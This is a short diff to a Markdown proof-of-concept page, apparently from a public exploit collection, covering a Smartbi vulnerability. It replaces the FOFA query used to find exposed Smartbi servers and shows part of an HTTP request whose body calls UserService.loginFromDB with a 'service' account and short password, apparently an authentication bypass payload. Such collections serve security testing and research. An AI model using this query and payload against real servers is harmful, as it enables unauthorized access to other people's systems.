@@ -2,7 +2,7 @@
 
 ## fofa
 ```
-app="SMARTBI"
+body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
 ```
 
 ## poc
@@ -21,7 +21,6 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 68
 
 className=UserService&methodName=loginFromDB&params=["service","0a"]
-
 ```
 
 ![image](https://github.com/wy876/POC/assets/139549762/419e82b7-4236-416d-91ef-74caf533e8ae)
